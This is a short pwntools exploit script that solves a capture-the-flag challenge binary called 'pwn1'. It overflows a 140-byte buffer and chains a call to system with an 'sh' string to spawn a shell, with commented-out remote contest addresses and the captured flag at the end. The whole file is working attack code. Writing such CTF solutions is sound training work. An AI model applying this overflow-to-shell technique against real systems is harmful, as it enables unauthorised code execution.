#!/usr/bin/env python
from pwn import *

# context.log_level='debug'

elf = ELF('pwn1')
pr = process('./pwn1') 
# pr = remote('120.27.144.177', 8000)
# pr = remote('114.55.7.125', 8000)

addr_system = elf.symbols['system']
addr_sh = next(elf.search('sh\0'))

p = 'A' * 140  + p32(addr_system) + p32(0xdeadbeaf) + p32(addr_sh)
pr.recvuntil('input your name:')
pr.sendline(p)
pr.recvuntil(':')
pr.sendline('1') 
pr.interactive() 

# FLAG{welc0me_t0_th3_429ctf}